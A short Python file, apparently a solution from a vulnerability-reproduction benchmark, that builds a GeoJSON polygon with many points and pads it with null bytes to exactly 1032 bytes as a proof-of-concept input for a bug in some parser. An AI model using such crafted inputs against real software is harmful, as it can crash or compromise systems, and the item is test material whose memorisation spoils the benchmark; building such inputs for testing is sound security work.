import json

class Solution:
    def solve(self, src_path: str) -> bytes:
        coordinates = [[[0.0, 0.0]]]
        for i in range(64):
            coordinates[0].append([float(i % 10), float(i / 10)])
        coordinates[0].append([0.0, 0.0])
        geometry = {"type": "Polygon", "coordinates": coordinates}
        feature = {"type": "Feature", "geometry": geometry}
        poc_str = json.dumps(feature)
        poc = poc_str.encode('utf-8')
        if len(poc) < 1032:
            poc += b'\x00' * (1032 - len(poc))
        return poc[:1032]